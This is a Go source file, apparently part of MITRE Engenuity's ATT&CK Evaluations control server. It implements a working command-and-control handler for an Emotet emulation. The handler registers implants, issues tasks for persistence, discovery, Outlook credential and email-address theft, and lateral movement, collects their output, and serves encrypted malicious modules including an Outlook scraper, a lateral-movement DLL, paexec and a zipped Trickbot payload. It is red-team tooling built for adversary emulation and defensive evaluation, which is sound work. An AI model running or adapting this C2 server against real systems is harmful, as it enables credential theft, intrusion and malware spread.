package emotet

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/gorilla/mux"
	"attackevals.mitre-engenuity.org/control_server/logger"
)

// enum of command id's for reference
const (
	peristence = 1
	discovery = 2
	installOutlookModule = 3
	loadOutlookModule = 4
	OutlookCredentialsNoStopNoRestart = 5
	OutlookCredentialsStopNoRestart = 6
	OutlookCredentialsStopRestart = 7
	OutlookEmailAddressesNoStopNoRestart = 8
	OutlookEmailAddressesStopNoRestart = 9
	OutlookEmailAddressesStopRestart = 10
	installLateralMovementModule = 11
	loadLaterMovementModule = 12
	installTrickbotAsZip = 13
	cmd = "cmd ..."
)

var quitChannel = make(chan int)
var quitSignal = 9

var RestAPIaddress = ""

// declare registration route format
var registerImplantRoute = "/"
var getTaskRoute = "/getTask"
var postTaskOutputRoute = "/output"
var serveModuleRoute = "/modules"
var outlookModuleRoute = "/emailDiscovery"

var aeskey = "1234567890123456"

func EncryptEncode(payload string) string {

	if len(payload) == 0 {
		return payload
	}

	payloadSize := len(payload)

	// Create hash of payload
	h := sha1.New()
	io.WriteString(h, payload)
	hash := fmt.Sprintf("%x", h.Sum(nil))
	
	// Padding
	for  {
		if (len(payload)%aes.BlockSize) != 0 {
			payload += "="
		} else {
			break
		}
	}

	block, err := aes.NewCipher([]byte(aeskey))
	if err != nil {
		fmt.Println(err)
		return payload
	}

	ciphertext := make([]byte, aes.BlockSize+len(payload))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext[aes.BlockSize:], []byte(payload))

	// Add hash and plaintext payload size to beginning of encrypted payload
	ciphertextWithHash := fmt.Sprintf("%s%d=%s", hash, payloadSize, string(ciphertext))

	// Encode with base64
	encodedPayload := base64.StdEncoding.EncodeToString([]byte(ciphertextWithHash))

	return string(encodedPayload)
}

// Trim trailling padding until hashes match
func trimPadding(plaintext string, hash string) string {
	for i := len(plaintext) -1 ; i >=0; i-- {
		// Create hash of plaintext
		h := sha1.New()
		io.WriteString(h, plaintext)
		generatedHash := fmt.Sprintf("%x", h.Sum(nil))

		if generatedHash == hash {
			return plaintext
		} else {
			plaintext = plaintext[:len(plaintext) - 1]
		}
	}
	return plaintext
}

// get payload size from beggining of given byte array
func getPayloadSize(payload []byte) (string, int) {
	payloadSizeStr := ""
	for i := 0; i < len(payload); i++ {
		if payload[i] == '=' {
			payloadSize, err := strconv.Atoi(payloadSizeStr)
			if err != nil {
				return "", 0
			}
			return payloadSizeStr, payloadSize
		}
		payloadSizeStr += string(payload[i])
	}
	payloadSize, err := strconv.Atoi(payloadSizeStr)
	if err != nil {
		return "", 0
	}
	return payloadSizeStr, payloadSize
}

// decode and decrypt function
func DecodeDecrypt(ciphertext []byte) string {

	if len(ciphertext) == 0 {
		return ""
	}

	// Decode
	ciphertext, _ = base64.StdEncoding.DecodeString(string(ciphertext))

	// Grab hash and size of payload from ciphertext
	hashStr := string(ciphertext[:40])
	ciphertext = ciphertext[40:]
	payloadSizeStr, _ := getPayloadSize(ciphertext)
	ciphertext = ciphertext[len(payloadSizeStr)+1:]


	block, err := aes.NewCipher([]byte(aeskey))
	if err != nil {
		fmt.Println("Error creating cipher")
		return ""
	}

	// The IV needs to be unique, but not secure. Therefore it's common to
	// include it at the beginning of the ciphertext.
	if len(ciphertext) < aes.BlockSize {
		fmt.Println("ciphertext too short")
		return ""
	}
	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]

	ciphertextStr := string(ciphertext)

	// Padding
	// CBC mode always works in whole blocks.
	for  {
		if (len(ciphertextStr)%aes.BlockSize) != 0 {
			ciphertextStr += "="
		} else {
			break
		}
	}

	ciphertext = []byte(ciphertextStr)
	
	if len(ciphertext)%aes.BlockSize != 0 {
		fmt.Printf("error: ciphertext is not a multiple of the block size %d",len(ciphertext) )
	}

	mode := cipher.NewCBCDecrypter(block, iv)

	// CryptBlocks can work in-place if the two arguments are the same.
	mode.CryptBlocks(ciphertext, ciphertext)

	// trim padding
	plaintext := trimPadding(string(ciphertext), hashStr)
	
	if len(plaintext) > 0 {
		return plaintext
	}

	return "unable to decrypt"
}

//setup route handlers and go functions for server start/stop
func StartHandler(listenAddr string, restAddress string) {

	// make sure we know the REST API address
	RestAPIaddress = restAddress

	r := mux.NewRouter()
	r.HandleFunc(registerImplantRoute, registerImplant).Methods("POST")
	r.HandleFunc(getTaskRoute, getTask).Methods("GET")
	r.HandleFunc(postTaskOutputRoute, postTaskOutput).Methods("POST")
	//r.HandleFunc("/getFile/{fileName}", GetFileFromServer).Methods("GET")
	//r.HandleFunc("/putFile/{fileName}", PostFileToServer).Methods("POST")

	r.HandleFunc(serveModuleRoute, ServeModule).Methods("GET")
	
	server := &http.Server{
		Addr:         listenAddr,
		WriteTimeout: time.Second * 15,
		ReadTimeout:  time.Second * 15,
		IdleTimeout:  time.Second * 60,
		Handler:      r,
	}
	// start rest api in goroutine so it doesn't block
	go func() {
		err := server.ListenAndServe()
		if err != nil && err.Error() != "http: Server closed" {
			logger.Error(err)
		}
	}()

	// gracefully terminate server when we receive QuitSignal
	go func() {
		killServer := <-quitChannel
		if killServer == quitSignal {
			emptyContext := context.Background()
			server.Shutdown(emptyContext)
		}
	}()
}

// Stop disables the Emotet handler
func StopHandler() {
	logger.Info("Killing Server")
	quitChannel <- quitSignal
}

type Registration struct {
	Guid string
	IpAddr string
    User string
    HostName string
    Dir string
    PID int
    PPID int
}

func registerImplant(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)

	decryptedBody := DecodeDecrypt(body)

	if err != nil {
		logger.Info(fmt.Sprintf("Error reading body: %v", err))
		http.Error(w, "can't read body", http.StatusBadRequest)
		return
	}

	// GUID
	guid := strings.Split(decryptedBody, ":")[0]

	additionalDataList := strings.Split(decryptedBody, ";;")

	user := strings.Split(additionalDataList[0], ":")[1]
	hostName := additionalDataList[1]
	dir := additionalDataList[2]
	pid, err := strconv.Atoi(additionalDataList[3])
	if err != nil {
		pid = 0
	}
	ppid, err := strconv.Atoi(additionalDataList[4])
	if err != nil {
		pid = 0
	}

	if (len(guid) == 0) {
		http.Error(w, "can't read guid", http.StatusBadRequest)
	}

	// Create json with Implant data
	registrationPreJson := Registration{guid, r.RemoteAddr, user, hostName, dir, pid, ppid}
	registrationJson, err := json.Marshal(registrationPreJson)
    if err != nil {
        fmt.Fprint(w, err)
    }

	// forward decoded data to REST API
	response, err := forwardRegisterImplant(registrationJson)
	if err != nil {
		fmt.Fprint(w, err)
	}
	fmt.Fprint(w, EncryptEncode(response))

}

func forwardRegisterImplant(registrationJson []byte) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/session"

	// initialize HTTP request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(registrationJson))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// execute HTTP POST request and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	if response.StatusCode != 200 {
		return "", err
	}
	// read response from REST API
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}

func getTask(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)

	decryptedBody := DecodeDecrypt(body)

	if err != nil {
		logger.Info(fmt.Sprintf("Error reading body: %v", err))
		http.Error(w, "can't read body", http.StatusBadRequest)
		return
	}

	// GUID
	guid := strings.Split(decryptedBody, ":")[0]

	if (len(guid) == 0) {
		http.Error(w, "can't read guid", http.StatusBadRequest)
	}

	response, err := forwardGetTask(guid)
	if err != nil {
		fmt.Fprint(w, err)
	}
	fmt.Fprint(w, EncryptEncode(response))
}

func forwardGetTask(guid string) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/task/" + guid
	resp, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	sessionData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(sessionData), err
}

func postTaskOutput(w http.ResponseWriter, r *http.Request) {
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		logger.Info(fmt.Sprintf("Error reading body: %v", err))
		http.Error(w, "can't read body", http.StatusBadRequest)
		return
	}

	decryptedBody := DecodeDecrypt(body)

	if (decryptedBody == "unable to decrypt") {
		http.Error(w, "can't read guid", http.StatusBadRequest)
	}
	// GUID
	guid := strings.Split(decryptedBody, ":")[0]
	taskOutput := decryptedBody
	
	if (len(guid) == 0) {
		http.Error(w, "can't read guid", http.StatusBadRequest)
	}

	response, err := forwardPostOutputTask(guid, taskOutput)
	if err != nil {
		fmt.Fprint(w, err)
	}
	fmt.Fprint(w, EncryptEncode(response))
}

func forwardPostOutputTask(guid string, output string) (string, error) {
	url := "http://" + RestAPIaddress + "/api/v1.0/task/output/" + guid

	// setup HTTP POST request
	req, err := http.NewRequest("POST", url, bytes.NewBufferString(output))
	if err != nil {
		return "", err
	}

	// execute HTTP POST and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()

	if response.StatusCode != 200 {
		e := fmt.Sprintf("Expected error code 200, got %v", response.StatusCode)
		err = errors.New(e)
		return "", err
	}

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}

func ServeModule(w http.ResponseWriter, r *http.Request) {
	// add validity check for correct input
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		logger.Info(fmt.Sprintf("Error reading body: %v", err))
		http.Error(w, "can't read body", http.StatusBadRequest)
		return
	}

	decryptedBody := DecodeDecrypt(body)

	var fileName string
	if bytes.Contains([]byte(decryptedBody), []byte("outlook")) {
		fileName = "OutlookScraper.dll"
	} else if bytes.Contains([]byte(decryptedBody), []byte("latmove")) {
		fileName = "LatMovementDLL.dll"
	} else if bytes.Contains([]byte(decryptedBody), []byte("paexec")) {
		fileName = "paexec.exe"
	} else if bytes.Contains([]byte(decryptedBody), []byte("WNetval")) {
		fileName = "WNetval.zip"
	} else {
		logger.Info(fmt.Sprintf("Body: %s", []byte(decryptedBody)))
	}

	if fileName != "" {
		fileData, err := ForwardGetFileFromServer(fileName)
		if err != nil {
			fmt.Fprint(w, err)
			w.Write([]byte(""))
			return
		}
		encryptedFileData := EncryptEncode(fileData)

		fmt.Fprint(w, encryptedFileData)
	} else {
		fmt.Fprint(w, "not found")
	}
}

func ForwardGetFileFromServer(fileName string) (string, error){
	url := "http://" + RestAPIaddress + "/api/v1.0/files/" + fileName
	resp, err := http.Get(url)
	if resp.StatusCode == 404 || err != nil {
		return "", err
	}
	fileData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	// WORKAROUND - I converted the fileData to a string because []byte converted it to an ASCII array of bytes
	return string(fileData), err
}